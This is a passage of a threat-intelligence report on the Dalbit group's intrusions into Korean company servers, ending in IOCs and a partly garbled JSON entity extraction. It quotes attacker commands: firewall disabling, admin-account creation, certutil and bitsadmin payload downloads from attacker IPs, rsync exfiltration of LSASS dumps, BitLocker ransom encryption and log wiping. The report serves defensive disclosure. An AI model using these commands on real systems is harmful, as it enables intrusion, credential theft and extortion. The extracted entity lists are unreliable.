sp.exe  netsh advfirewall set allprofiles state off  (Firewall OFF)   sp.exe  net user main ff0.123456 /add   net localgroup administrators main /add  (Add account) Table 8. SweetPotato usage log The point of focus here is the name of the account added by the threat actor. Threat actor accounts with the name  main  have been found inother infiltrated company servers. Aside from adding accounts  the threat actor would also use stolen admin accounts.   wmic /node:127.0.0.1 /user:storadmin /password:r     1234 @ $ process call create  cmd.exe /c c:\\temp\\s.bat  Table 9. Admin account execution log 3.2.4. Proxy Settings After infiltrating a server  the threat actor initiates access via proxy to use RDP communications. FRP and LCX were the mainly used proxytools  and there have been cases where ReGeorg  NPS  or RSOCKS was found in some companies. Additionally  multiple proxy tools includingFRP and LCX were found in one area of a certain company that was infiltrated. Multiple FRP configuration files (.ini) would also be discoveredin cases where internal propagation had occurred. We believe that the threat actor installs additional FRPs and uses multiple configurationfiles when an accessible PC has a lot to gain. Furthermore  the LCX used by this group has the same features as the open-source LCX  but itsversion is not the same as the one uploaded to GitHub  meaning that a binary that was arbitrarily compiled by a Chinese person was used. Proxy tools like FRP and LCX differ in terms of forwarding methods and supported protocols. However  since their differences  actual infectioncases  recreation  and network packets have all been covered in the TI report   Analysis Report on Attack Cases Exploiting Various RemoteControl Tools   they will not be reiterated in this post. 1) FRP(FAST REVERSE PROXY) FRP configuration files (.ini) were found in all servers and PC devices infiltrated by this group. The following is an actual case of an infiltratedcompany. Figure 3. FRPC configuration file (m00nlight.top) found in an infiltrated company In particular  the Dalbit group usually used the Socks5 protocol to communicate. The Socks5 protocol is a layer 5 protocol in the 7 OSI layers. Itcan handle various requests such as HTTP  FTP  and RDP since it is between layer 4 and 7. Therefore  if the threat actor uses a proxyconnection tool that can handle Socks5  such as Proxifier  remote control through RDP becomes possible. If a connection can be established toan internal PC  lateral movement can also be achieved. Thus  if the configuration file is set as a Socks5 protocol  the threat actor will have morefreedom as additional modifications will no longer be required to handle various requests. 6 / 1 7 Figure 4. Example of Socks5 usage The following are FRP filenames and commands used by the threat actor. The list is in a descending order from most to least used. FRP filenames update.exe debug.exe main.exe info.exe Agent.exe frpc.exe test.exe zabbix.exe winh32.exe cmd.exe Table 10. FRP filenames FRP commands   update.exe -c frpc.ini   update.exe -c 8080.ini   update.exe -c 8.ini   info.zip -c frpc__8083.ini   debug.exe -c debug.ini   debug.exe -c debug.log   debug.exe -c debug.txt   frpc.exe -c frpc__2381.ini   cmd.exe /c c:\\temp\\    \\temp\\frpc.ini   Table 11. FRP execution log In certain companies  the FRP was registered to the task scheduler (schtasks) under the name  debug  to maintain its persistence. As shown inTable 12  the team confirmed the execution of a registered scheduler. 7 / 1 7   schtasks /tn debug /run Table 12. Task scheduler execution log 2) LCX(HTRAN) Dalbit used an LCX (Htran) binary compiled by a certain Chinese person. This has the same features as the existing binary  but it also includesthe nickname of the binary creator. Figure 5. Screen that is displayed upon executing the LCX used by the Dalbit group (By \u6298\u7fbd\u9e3f\u9e44 ) We can confirm through this that the nickname of the person who had created the binary is   \u6298\u7fbd\u9e3f\u9e44   (QQ:56345566). It is highly unlikelythat this developer is the threat actor in question  however  since this binary cannot be downloaded through a simple search online  it isassumed that the threat actor has a connection to China. The installed filenames and executables are as follows: LCX filenames lcx3.exe lcx.exe update.exe Table 13. LCX filenames LCX commands   update.exe -slave 1.246.   .    110 127.0.0.1 3389   lcx3.exe -slave 222.239.   .    53 127.0.0.1 3389   Table 14. LCX command log The above LCX C2 is a Korean company server and has been concealed. 3.2.5. Internal Reconnaissance Fscan and NBTScan have been commonly used for network scans  but the usage of TCP Scan and Goon have also been confirmed for somecases. Goon is a network scanning tool made with Golang that not only allows basic port scanning  but scanning for Tomcat  MSSQL  and MYSQLaccounts as well. We can see that this tool was also made in Chinese. 8 / 1 7 Figure 6. Screen that is displayed upon executing Goon 3.2.6. Information Extortion LSASS Dump information and EML files of certain accounts are usually the information that is stolen. It has been confirmed that installedprograms are checked through a WMIC command or a screenshot of the affected PC is sent to the threat actor s server at regular intervalsaccording to the companies. 1) Credential Extraction (LSASS Dump) According to the target  the threat actor would choose to not install Mimikatz and attempt to extract credentials instead. This is a method thatdumps the Lsass.exe process. Credential information can be obtained from a PC with tools like Mimikatz or Pypykatz since they can be foundwithin the dump file. Additionally  a detailed explanation of Mimikatz can be found in the TI report   Analysis Report on Internal WebSpreading Methods Using Mimikatz . The following method is how the threat actor stole credentials without Mimikatz. 1-1) Dumpert Open-source Dumpert is an API hooking evasion tool that operates according to the target OS system and uses the MiniDumpWriteDump()API to dump the lsass.exe process. The threat actor modified the code to change the path of the dump file and remove features like log output. Figure 7. Left (open-source Dumpert) vs. right (Dumper used by the Dalbit group) 9 / 1 7 The above figure shows that the two versions are the same aside from the different paths and the removal of the output string. The following table displays all of the   SystemRoot \\temp  dump file paths that have currently been found.  SystemRoot \\temp\\duhgghmpert.dmp  SystemRoot \\temp\\dumpert.dmp  SystemRoot \\temp\\tarko.dmp  SystemRoot \\temp\\lsa.txt   Table 15. Lsass dump file paths 1-2 ) Procdump Procdump is a normal utility program provided by Microsoft and offers the process dump feature. The threat actor performed a dump like theone in Figure 8 with this tool. Figure 8. Output upon executing Procdump Afterward  the threat actor used a tool called Rsync (Remote Sync) to send the dump file to their own server. The following is an actual exampleof information theft attempted by the threat actor.   svchost.exe -accepteula -ma lsass.exe web_log.dmp   rsync -avz  port 443 web_log.zip test@205.185.122[.]95::share/web_log.zip Table 16. Procdump execution and rsync usage log 2) Email Extraction Figure 9. Screen displayed upon executing email extraction tool This sample is an email extraction tool developed with Golang and presumably the only known tool developed by the threat actor themselves.This tool offers the ability to target a company s Exchange email server and extract a specific account s email with EWS (Exchange WebService) as an EML file. Arguments include the Exchange server address  account name  NTLM password hash of said account  date and time etc. When launched  the tool extracts every email from the mailboxes of the target account according to the time received as an argument andsaves them as an EML file. For reference  the PDB information of this binary is  fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff and is meaningless. 1 0 / 1 7 Figure 10. PDF information of the email extraction tool 3) Screen Leak The threat actor sent screenshots from certain PCs to their own server. While a binary that takes screenshots of the current screen has not beenfound as of yet  the threat actor s server where the infected PC s screenshots were being sent has been discovered. Screenshots from a certaincompany s infiltrated PC sent pictures every 5-10 seconds. Outgoing server of threat actor s screenshots: hxxp://91.217.139[.]117:8080/1.bat 1 1 / 1 7 Figure 11. Actual PC screenshot sent from a certain affected company Only images were sent. The PC could not be controlled remotely and no audio was outputted either. Also  the threat actor s server (91.217.139[.]117) where the screenshots were being sent was also being used as a download server for anothercompany.  certutil -urlcache -split -f hxxp://91.217.139[.]117:8080/calc32.exe  certutil -split -urlcache -f hxxp://91.217.139[.]117:8443/log.ini c:\\temp  bitsadmin /transfer mydownloadjob /download/priority normal  hxxp://91.217.139[.]117:8080/calc32.exe   c:\\windows\\debug\\winh32.exe  (frpc)  bitsadmin /transfer mydownloadjob /download /priority normal  hxxp://91.217.139[.]117:8001/log.ini  c:\\windows\\debug\\log.ini  (frpc.ini) Table 17. A different log from the threat actor s server (91.217.139[.]117) 4) Lookup Installed Programs and Login Information The threat actor used a WMIC command to check installed programs.   wmic product get name version Table 18. How the threat actor looked up installed programs 1 2 / 1 7 Figure 12. List of installed programs and command example (WMIC) Furthermore  the domain account credentials that caused certain event IDs to occur in the event log were collected. The created file is saved inc:\\temp\\EvtLogon.dat. Event IDMeaning 4624 Login successful 4768 Kerberos authentication request 4776 NTLM authentication attempt Table 19. Meanings of the event IDs used by the threat actor   wevtutil qe security /q: Event[System[(EventID 4624 or EventID 4768 or EventID 4776)]]  /f:text /rd:true   c:\\temp\\EvtLogon.dat Table 20. wevtutil command log 3.2.7. File Encryption Details about this matter have been covered in a past blog post. The threat actor used BitLocker  a Windows utility  to encrypt certain drivesand demand ransoms. Currently  more affected companies are still being found. BitLocker commands    C:\\Windows\\System32\\BitLockerWizardElev.exe  F:\\ T   manage-bde -lock -ForceDismount F:   manage-bde -lock -ForceDismount e:    c:\\windows\\system32\\bitlockerwizardelev.exe  e:\\ t    c:\\windows\\system32\\bitlockerwizardelev.exe  f:\\ u Table 21. BitLocker log Figure 13 is the ransom note used by the threat actor. The threat actor used anonymous mailing services such as startmail.com andonionmail.com. Figure 13. Ransom note that was shown in a previous blog post The command assumed to be for downloading the ransom note is as follows.   certutil -urlcache -split -f hxxp://175.24.32[.]228:8888/readme c:\\windows\\temp\\readme Table 22. Log assumed to display the ransom note being downloaded 3.2.8. Evasion 1) VMPROTECT PACKING When the binary was detected after being uploaded  the threat actor packed it with VMProtect to try and avoid detection. 1 3 / 1 7   Privilege escalation tools ALLUSERSPROFILE \\badpotatonet4.exe ALLUSERSPROFILE \\BadPotatoNet4.vmp.exe ALLUSERSPROFILE \\SweetPotato.exe ALLUSERSPROFILE \\SweetPotato.vmp.exe ALLUSERSPROFILE \\jc.vmp.exe SystemDrive \\nia\\juicypotato.vmp1.exe SystemDrive \\nia\\juicypotato.vmp.exe   Proxy toolsE:\\WEB\\     \\data\\frpc.vmp.exe ALLUSERSPROFILE \\lcx.exe ALLUSERSPROFILE \\lcx_VP.exe SystemDrive \\Temp\\lcx.exe SystemDrive \\Temp\\lcx_VP.exe SystemDrive \\Temp\\svchost.exe (FRP) SystemDrive \\Temp\\frpc.vmp.exe  Table 23. File packed with VMP 2) Windows Event Log Deletion Using Wevtutil Removal of security event logs   cmd.exe /c wevtutil cl security Removal of application logs   cmd.exe wevtutil.exe el   cmd.exe wevtutil.exe cl  application  Table 24. Deletion of Windows event logs 3) Firewall OFF sp.exe  netsh advfirewall set allprofiles state off  Table 25. Firewall OFF 4. Conclusion The Dalbit hacking group attempted attacks against vulnerable Korean company servers  and logs are being reported not only from mid-sizedand smaller businesses  but also from some large companies. In particular  30  of the affected companies were found to have been using acertain Korean groupware product. Moreover  this group uses publicly available tools  from the WebShell used in the early stages to theransomware used at the end. Among these tools  there is a proxy tool that is assumed to have been obtained from a Chinese community  a toolwith Chinese documentation  and a Chinese tool not mentioned in this post. It can be assumed that the threat actor has at least a partialconnection with China  considering their frequent usage of Chinese tools. If a server admin suspects that their system has been infected  they are advised to check their IOC along with the aforementioned downloadpaths and account name ( main ) often used by the threat actor. If suspicions are confirmed  then it is advised to immediately report yoursituation to AhnLab in order to minimize additional harm. Furthermore  admins should prevent vulnerability attacks by updating their serversto the newest version for vulnerability patches  and maintenance is especially needed for servers that are open externally but not managed. 5. IOC For reference  the IP addresses of Korean company servers abused by the threat actor will not be disclosed on the ASEC blog. Mitre Attack Execution PersistencePrivilegeEscalationCredentialAccessDiscoveryDefenseEvasion LateralMovement   Command andScriptingInterpreter(T1059)  WindowsManagementInstrumentation(T1047)  SystemService(T1569)   ScheduledTask/Job(T1053)  CreateAccount(T1136)  Server SoftwareComponent(T1505)  AccountManipulation(T1098)   Access TokenManipulation(T1134)  Exploitation forPrivilegeEscalation(T1068)   OSCredentialDumping(T1003)   RemoteSystemDiscovery(T1018)  NetworkServiceDiscovery(T1046)   ImpairDefenses(T1562)  IndicatorRemoval(T1070)   RemoteServices(T1021)  Lateral ToolTransfer(T1570) Table 26. MITRE Attack 1 4 / 1 7 Detection Names WebShell/Script.Generic (2020.12.11.09) WebShell/ASP.ASpy.S1361 (2021.02.02.03) WebShell/ASP.Generic.S1855 (2022.06.22.03) WebShell/ASP.Small.S1378 (2021.02.24.02) WebShell/JSP.Godzilla.S1719(2021.12.03.00) WebShell/JSP.Chopper.SC183868(2022.10.15.01) WebShell/JSP.Generic.S1363 (2021.01.27.03) Backdoor/Script.Backdoor (2015.01.04.00) WebShell/JSP.Generic.S1956 (2022.11.14.00) Trojan/Script.Frpc (2022.12.17.00) JS/Webshell (2011.08.08.03) HackTool/Win.Fscan.C5334550(2023.01.27.00) HackTool/Win.Fscan.C5230904(2022.10.08.00) HackTool/Win.Fscan.R5229026(2022.10.07.03) Trojan/JS.Agent(2022.03.16.02) Unwanted/Win32.TCPScan.R33304(2012.08.17.00) HackTool/Win.Scanner.C5220929(2022.08.09.02) HackTool/Win.SweetPotato.R506105 (2022.08.04.01) Exploit/Win.BadPotato.R508814 (2022.08.04.01) HackTool/Win.JuicyPotato.R509932 (2022.08.09.03) HackTool/Win.JuicyPotato.C2716248 (2022.08.09.00) Exploit/Win.JuicyPotato.C425839(2022.08.04.01) Exploit/Win.SweetPotato.C4093454 (2022.08.04.01) Trojan/Win.Escalation.R524707(2022.10.04.02) Trojan/Win.Generic.R457163(2021.12.09.01) HackTool/Win64.Cve-2019-1458.R345589(2020.07.22.06) Malware/Win64.Generic.C3164061 (2019.04.20.01) Malware/Win64.Generic.C3628819 (2019.12.11.01) Exploit/Win.Agent.C4448815 (2021.05.03.03) Trojan/Win.Generic.C4963786 (2022.02.11.04) Trojan/Win.Exploit.C4997833 (2022.03.08.01) Exploit/Win.Agent.C5224192 (2022.08.17.00) Exploit/Win.Agent.C5224193 (2022.08.17.00) Trojan/Win32.RL_Mimikatz.R290617(2019.09.09.01) Trojan/Win32.Mimikatz.R262842(2019.04.06.00) Trojan/Win.Swrort.R450012(2021.11.14.01) HackTool/Win.Lsassdump.R524859(2022.10.05.00) HackTool/Win.ProxyVenom.C5280699(2022.10.15.01) Unwanted/Win.Frpc.C5222534 (2022.08.13.01) Unwanted/Win.Frpc.C5218508 (2022.08.03.03) Unwanted/Win.Frpc.C5218510 (2022.08.03.03) Unwanted/Win.Frpc.C5218513 (2022.08.03.03) HackTool/Win.Frpc.5222544 (2022.08.13.01) HackTool/Win.Frp.C4959080 (2022.02.08.02) HackTool/Win.Frp.C5224195 (2022.08.17.00) Unwanted/Win.Frpc.C5162558 (2022.07.26.03) Malware/Win.Generic.C5173495 (2022.06.18.00) HackTool/Win.LCX.C5192157 (2022.07.04.02) HackTool/Win.LCX.R432995(2023.01.06.01) HackTool/Win.Rsocx.C5280341(2022.10.15.00) Backdoor/Win.BlueShell.C5272202(2022.10.05.00) Trojan/Win.BlueShell.C5280704(2022.10.15.01) Backdoor/Win.CobaltStrike.R360995(2022.09.20.00) Unwanted/Win.Extractor.C5266516(2022.10.01.00) Trojan/Win.RemCom.R237878(2023.01.07.00) [IOC] MD5 (Excluding normal files) 1 5 / 1 7   WebShell0359a857a22c8e93bc43caea07d07e2385a6e4448f4e5be1aa135861a2c35d354fc81fd5ac488b677a4c0ce5c272ffe3c0452b18695644134a1e38af0e9741726b4c7ea91d5696369dd0a848586f0b2896b23ff19a945fad77dd4dd6d166faaa88bef25e4958d0a198a2cc0d921e4384c908340bf152b96dc0f270eb6d39437f2c3de1cefe5cd2a5315a9c9970277bd7e5b626c4b172065005d04205b026e44627ec6fb6739c4886b3c9e21b6b9041b6612585fa3ada349a02bc97d4c60de78421c7b2e6e0fb603c5fdd33781ac84b8fc44457653b2c69933e04734fe31ff699e31b7d841b1865e11eab056e70416f1a69c7d9025fa3841c4cd69db1353179cffca13226da57b33f95bf3faad1004ee0af002abd289296572d8afadfca809294e981219f6ba673e977c5c1771f86b189f978d05f1ebeb5df334f395d58a7e108e3af60f483774014c43a7617c44d05e7c802dd3d8732d9834c5a558e9d39ed3707191f554ed5d9025bc85ee1bf51f97561a687b0bea0ef97224c7bd2df118b87 (omitted)   Privilege Escalation9fe61c9538f2df492dff1aab0f90579fab9091f25a5ad44bef898588764f199087e5c9f3127f29465ae04b9160756c62ab9091f25a5ad44bef898588764f1990 4bafbdca775375283a90f47952e182d90311ee1452a19b97e626d24751375652acacf51ceef8943f0ee40fc181b6f1fa3cbea05bf7a1affb821e379b1966d89c10f4a1df9c3f1388f9c74eb4cdf24e7cb5bdf2de230722e1fe63d88d8f628ebcedb685194f2fcd6a92f6e909dee7a237e9bd5ed33a573bd5d9c4e071567808e5fbae6c3769ed4ae4eccaff76af7e7dfe 937435bbcbc3670430bb762c56c7b329fd0f73dd80d15626602c08b90529d9fd29274ca90e6dcf5ae4762739fcbadf01784becfb944dec42cccf75c8cf2b97e37307c6900952d4ef385231179c0a05e4bcfca13c801608a82a0924f787a19e1d 75fe1b6536e94aaee132c8d022e14f85 d6cb8b66f7a9f3b26b4a98acb2f9d0c5 323a36c23e61c6b37f28abfd5b7e5dfe7b40aa57e1c61ecd6db2a1c18e08b0af3665d512be2e9d31fc931912d5c6900e   Network Scan1aca4310315d79e70168f15930cc3308 5e0845a9f08c1cfc7966824758b6953a9b0e4652a0317e6e4da66f29a74b5ad7d8d36f17b50c8a37c2201fbb0672200ab998a39b31ad9b409d68dcb74ac6d97dd5054ed83e63f911be46b3ff8af82267e7b7bf4c2ed49575bedabdce2385c8d5 f01a9a2d1e31332ed36c1a4d2839f412 d4d8c9be9a4a6499d254e845c6835f5f   FRP4eb5eb52061cc8cf06e28e7eb20cd0550cc22fd05a3e771b09b584db0a1613638de8dfcb99621b21bf66a3ef2fcd8138df8f2dc27cbbd10d944210b19f97dafd2866f3c8dfd5698e7c58d166a5857e1e 1 6 / 1 7 cbee2fd458ff686a4cd2dde42306bba13dc8b64b498220612a43d36049f055ab31c4a3f16baa5e0437fdd4603987b812b33a27bfbe7677df4a465dfa9795ff4a7d9c233b8c9e3f0ea290d2b84593c842c4f18576fd1177ba1ef54e884cb7a79d5d33609af27ea092f80aff1af6ddf98d622f060fce624bdca9a427c3edec16631f2432ec77b750aa3e3f72c866584dc3d331602d190c0963ec83e46f5a5cd54a21d268341884c4fc62b5af7a3b433d90   FRP_INI6a20945ae9f7c9e1a28015e40758bb4fa29f39713ce6a92e642d14374e7203f07ce988f1b593e96206a1ef57eb1bec8afc9abba1f212db8eeac7734056b81a6e9f55b31c66a01953c17eea6ace66f63633129e959221bf9d5211710747fddabe48b99c2f0441f5a4794afb4f89610e4828e026b9550e4eb37435013425abfa382ceabffe2d40714e5535212d46d78119c72750485db39d0c04469cd6b100a59568403cc3a6fcbeb9e5e9f7263d04c02f52ff6e3e942ac8ee012dcde89e7a1116d82481e9bc50d9d9aeb9d56072bf3cfe22381941763862631070e043d4dd0dc26b5bccf615bf634b0e55a86a9c24c902942d949a28b2921fb980e2d659e6ef75059d98dcb83be037cd9829d31c096dabcca50cdd843aa824e5eef5f05e74f4a5f6f0d44aa5e3d83bb1ac777c9cea70600ca345bc074fa2ef7a2797b875b6cd4df6da8dc4e1226aa2d0dabc32acd069150bbfaea19c8d1444ae282ff5911a527b   LCXa69d3580921ec8adce64c9b38ac3653ac4e39c1fc0e1b165319fa533a9795c44fb6bf74c6c1f2482e914816d6e97ce09678dbe60e15d913fb363c8722bde313d   Proxies etc.e0f4afe374d75608d604fbf108eac64f f5271a6d909091527ed9f30eafa0ded6 ae8acf66bfe3a44148964048b826d005   Lateral Movement6983f7001de10f4d19fc2d794c3eb534fcb7f7dab6d401a17bd436fc12a84623   Information Collection and Credential Theftbb8bdb3e8c92e97e2f63626bc3b254c480f421c5fd5b28fc05b485de4f7896a1a03b57cc0103316e974bbb0f159f78f646f366e3ee36c05ab5a7a319319f7c727bd775395b821e158a6961c573e6fd43 b434df66d0dd15c2f5e5b2975f2cfbe2 1 7 / 1 7 c17cfe533f8ce24f0e41bd7e14a35e5e   Backdoor011cedd9932207ee5539895e2a1ed60abc744a4bf1c158dba37276bf7db50d8523c0500a69b71d5942585bb87559fe8353271b2ab6c327a68e78a7c0bf9f4044c87ac56d434195c527d3358e12e2b2e0 C2 and URL (Abused Korean company servers are not listed)   Download C2 91.217.139[.]117   Upload C2 205.185.122[.]95 91.217.139[.]117   FRP   LCX C2 hxxp://sk1.m00nlight[.]top:80 (45.136.186.19) //MOACK_Co_LTD company server hxxps://fk.m00nlight[.]top:443 (45.136.186.175:443) //MOACK_Co_LTD company server hxxps://aa.zxcss[.]com:443 (45.93.31.122) //MOACK_Co_LTD company server 45.93.31[.]75:7777 //MOACK_Co_LTD company server 45.93.28[.]103:8080 //MOACK_Co_LTD company server 103.118.42[.]208 101.43.121[.]50   Backdoor C2 45.93.31[.]75 //MOACK_Co_LTD company server Subscribe to AhnLab s next-generation threat intelligence platform  AhnLab TIP  to check related IOC and detailed analysisinformation. Categories:Malware Information Tagged as:AntSword APT AspxSpy BadPotato BitLocker Bitsadmin Blueshell certutil Chopper CobaltStrike conf.aspx CVE-2017-10271 CVE-2018-8639 CVE-2019-1458 Dalbit duhgghmpert.dmp Dumpert EFSPotato ff0.123456 FRP FSCAN Godzilla Gotohttp HTRAN JuicyPotato Ladon LCX m00nlight main Mimikatz NPS NTLTEST ProcDump RDP ReGeorg RottenPotato Rsync SweetPotato WebLogic xp_cmdshell",
            "commands": [
              "cmd.exe /c wevtutil cl security  Removal of application logs > cmd.exe wevtutil.exe el > cmd.exe wevtutil.exe cl \u201capplication\u201d",
              "schtasks  /tn debug /run",
              "WMIC command or a screenshot of the affected PC is sent to the threat actor\u2019s server at regular intervalsaccording to the companies.",
              "WMIC command to check installed programs.",
              "net user main ff0.123456 /add & net localgroup administrators main /add\u201d (Add account)",
              "wmic product get name,version",
              "wmic  /node:127.0.0.1 /user:storadmin /password:r*****1234!@#$  process call create \u201ccmd.exe /c c:\\temp\\s.bat\u201d",
              "cmd.exe /c c:\\temp\\****\\temp\\frpc.ini \u2026"
            ],
            "file_paths": [
              "/Win.ProxyVenom.C5280699(2022.10.15.01)",
              "/Win.LCX.R432995(2023.01.06.01)",
              "/Win64.Cve-2019-1458.R345589(2020.07.22.06)",
              "c:\\temp\\s.bat\u201d",
              "/Win64.Generic.C3628819",
              "/Win.Frp.C4959080",
              "/aa.zxcss[.]com:443",
              "/Win.BadPotato.R508814",
              "/www.ive***.co[.]kr/uploadfile/ufaceimage/1/update.zip",
              "/Win32.Mimikatz.R262842(2019.04.06.00)",
              "/Script.Generic",
              "/Win.Scanner.C5220929(2022.08.09.02)",
              "/Win.BlueShell.C5272202(2022.10.05.00)",
              "/Win.Frpc.5222544",
              "/JS.Agent(2022.03.16.02)",
              "/node:127.0.0.1",
              "/ASP.ASpy.S1361",
              "/Win.JuicyPotato.C425839(2022.08.04.01)",
              "/Win.Fscan.C5230904(2022.10.08.00)",
              "D:\\Web\\(Groupware)\\bbs\\4.asmxD",
              "/Win.Swrort.R450012(2021.11.14.01)",
              "/Win32.RL_Mimikatz.R290617(2019.09.09.01)",
              "/Script.Frpc",
              "/Win.Lsassdump.R524859(2022.10.05.00)",
              "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary",
              "/Win.Generic.C4963786",
              "/Win.LCX.C5192157",
              "/Win.Escalation.R524707(2022.10.04.02)",
              "/ASP.Small.S1378",
              "/JSP.Generic.S1956",
              "/fk.m00nlight[.]top:443",
              "D:\\",
              "/Win.Rsocx.C5280341(2022.10.15.00)",
              "/91.217.139[.]117:8080/calc32.exe\u201d\u201cc:\\windows\\debug\\winh32.exe\u201d",
              "C:\\(Tomcat)\\webapps\\docs\\update.jspC",
              "c:\\programdata\\update.exe",
              "/JSP.Godzilla.S1719(2021.12.03.00)",
              "/Win.Generic.C5173495",
              "/Win.Fscan.R5229026(2022.10.07.03)",
              "c:\\temp\\EvtLogon.dat",
              "D:\\WEB\\",
              "D:\\inetpub\\(Groupware)\\image\\2.asmxD",
              "C:\\(Tomcat)\\webapps\\dd\\sb.jspC",
              "c:\\temp\\",
              "/Win.BlueShell.C5280704(2022.10.15.01)",
              "/Win.Extractor.C5266516(2022.10.01.00)",
              "/sk1.m00nlight[.]top:80",
              "/Win.Generic.R457163(2021.12.09.01)",
              "/JSP.Chopper.SC183868(2022.10.15.01)",
              "/91.217.139[.]117:8443/log.ini",
              "/103.118.42[.]208:8080/frpc.exe",
              "/Win.Exploit.C4997833",
              "/Win.Agent.C4448815",
              "D:\\Web\\(Groupware)\\cop\\1.ashxD",
              "D:\\Oracle\\",
              "/Win.Frpc.C5218510",
              "/Win.Frpc.C5162558",
              "/91.217.139[.]117:8080/calc32.exe",
              "C:\\(Groupware)\\Web\\(Groupware)\\cop\\conf.aspxC",
              "/Win.Agent.C5224193",
              "/Win.Frpc.C5218508",
              "/web_log.zip",
              "/JSP.Generic.S1363",
              "/175.24.32[.]228:8888/readme",
              "/Win.Frpc.C5218513",
              "/121.167.***[.]***/temp/8.txt",
              "/Win32.TCPScan.R33304(2012.08.17.00)",
              "c:\\windows\\debug\\winh32.exe\u201d",
              "f:\\",
              "C:\\(Groupware)\\Web\\(Groupware)\\cop\\1.asmxC",
              "/Win.JuicyPotato.R509932",
              "/ASP.Generic.S1855",
              "c:\\programdata\\8.ini",
              "/Win.RemCom.R237878(2023.01.07.00)",
              "/Win.JuicyPotato.C2716248",
              "C:\\Windows\\System32\\BitLockerWizardElev.exe\u201d",
              "/Win.CobaltStrike.R360995(2022.09.20.00)",
              "/Win64.Generic.C3164061",
              "F:\\",
              "/Win.Frp.C5224195",
              "c:\\temp\\EvtLogon.dat.",
              "c:\\windows\\system32\\bitlockerwizardelev.exe\u201d",
              "e:\\",
              "/91.217.139[.]117:8080/calc32.exe\u201d",
              "E:\\WEB\\",
              "/Win.Frpc.C5222534",
              "/91.217.139[.]117:8080/1.bat",
              "/Win.Fscan.C5334550(2023.01.27.00)",
              "/91.217.139[.]117:8001/log.ini\u201d\u201cc:\\windows\\debug\\log.ini\u201d",
              "/Win.SweetPotato.C4093454",
              "D:\\UploadData\\",
              "/",
              "/Win.Agent.C5224192",
              "/Script.Backdoor",
              "/Win.SweetPotato.R506105"
            ],
            "registry_keys": []
          },
          "entities": {
            "malware": [
              "APT",
              "Backdoor",
              "Downloader",
              "Malware",
              "MetaSploit",
              "Mimikatz",
              "ProcDump",
              "Trojan",
              "conti",
              "loader",
              "ransomware",
              "rat"
            ],
            "tools": [
              "At",
              "Bitsadmin",
              "CMD",
              "Certutil",
              "MetaSploit",
              "Mimikatz",
              "PsExec",
              "ReG",
              "WMI",
              "net",
              "netsh",
              "ping",
              "sc",
              "schtasks",
              "wmic"
            ],
            "threat_actors": [],
            "ips": [
              "127.0.0.1",
              "45.136.186.175",
              "45.136.186.19",
              "45.93.31.122"
            ],
            "domains": [
              "1.ashxC",
              "1.ashxD",
              "1.asmxC",
              "1.aspx",
              "1.bat",
              "11.aspxC",
              "123.jspD",
              "2.asmxD",
              "2.aspxC",
              "2.aspxD",
              "3.aspxD",
              "4.ashxD",
              "4.asmxD",
              "8.ini",
              "8.txt",
              "8080.ini",
              "ASP.ASpy",
              "ASP.Generic",
              "ASP.NET",
              "ASP.NETFiles",
              "ASP.Small",
              "Agent.exe",
              "BadPotatoNet4.vmp.exe",
              "BitLockerWizardElev.exe",
              "EvtLogon.dat",
              "JS.Agent",
              "JSP.Chopper",
              "JSP.Generic",
              "JSP.Godzilla",
              "Lsass.exe",
              "Microsoft.NET",
              "Script.Backdoor",
              "Script.Frpc",
              "Script.Generic",
              "SweetPotato.exe",
              "SweetPotato.vmp.exe",
              "Win.Agent",
              "Win.BadPotato",
              "Win.BlueShell",
              "Win.CobaltStrike",
              "Win.Escalation",
              "Win.Exploit",
              "Win.Extractor",
              "Win.Frp",
              "Win.Frpc",
              "Win.Fscan",
              "Win.Generic",
              "Win.JuicyPotato",
              "Win.LCX",
              "Win.Lsassdump",
              "Win.ProxyVenom",
              "Win.RemCom",
              "Win.Rsocx",
              "Win.Scanner",
              "Win.SweetPotato",
              "Win.Swrort",
              "Win32.Mimikatz",
              "Win32.TCPScan",
              "Win64.Cve",
              "Win64.Generic",
              "aa.aspxD",
              "aa.zxcss",
              "aaa.jsp",
              "andonionmail.com",
              "asec.ahnlab.com",
              "badpotatonet4.exe",
              "bitlockerwizardelev.exe",
              "calc32.exe",
              "cmd.exe",
              "conf.aspx",
              "conf.aspxC",
              "conf.aspxD",
              "debug.exe",
              "debug.ini",
              "debug.log",
              "debug.txt",
              "duhgghmpert.dmp",
              "dumpert.dmp",
              "eee.jspD",
              "error.jspD",
              "etc.Chemical",
              "file.aspx",
              "frpc.exe",
              "frpc.ini",
              "frpc.vmp.exe",
              "group.The",
              "index.jspC",
              "info.exe",
              "info.zip",
              "information.Additionally",
              "java.exe",
              "jc.vmp.exe",
              "juicypotato.vmp.exe",
              "juicypotato.vmp1.exe",
              "lcx.exe",
              "lcx3.exe",
              "log.ini",
              "lsa.txt",
              "lsass.exe",
              "m00nlight.top",
              "main.exe",
              "modifyregistryhelp.jspD",
              "s.bat",
              "sb.jspC",
              "shell.jsp",
              "sp.exe",
              "sqlserver.exe",
              "startmail.com",
              "svchost.exe",
              "tarko.dmp",
              "test.exe",
              "test.jsp",
              "themselves.This",
              "tunnel.aspx",
              "update.exe",
              "update.jspC",
              "update.zip",
              "w3wp.exe",
              "wevtutil.exe",
              "winh32.exe",
              "www.ive",
              "zabbix.exe"
            ],
            "hashes": {
              "md5": [
                "75fe1b6536e94aaee132c8d022e14f85",
                "ae8acf66bfe3a44148964048b826d005",
                "b434df66d0dd15c2f5e5b2975f2cfbe2",
                "c17cfe533f8ce24f0e41bd7e14a35e5e",
                "d4d8c9be9a4a6499d254e845c6835f5f"
              ]
            }
          },
          "ttp_indicators": {
            "initial_access": [
              "Phishing",
              "Exploit Public-Facing Application"
            ],
            "execution": [
              "Command and Scripting Interpreter",
              "Windows Management Instrumentation"
            ],
            "persistence": [
              "Registry Run Keys",
              "Scheduled Task/Job",
              "Create or Modify System Process"
            ],
            "credential_access": [
              "OS Credential Dumping"
            ],
            "discovery": [
              "Network Service Discovery",
              "Account Discovery"
            ],
            "lateral_movement": [
              "Remote Desktop Protocol",
              "Remote Services"
            ],
            "collection": [
              "Archive Collected Data",
              "Screen Capture"
            ],
            "exfiltration": [
              "Exfiltration Over C2 Channel"
            ],
            "command_and_control": [
              "Application Layer Protocol"
            ]
          },
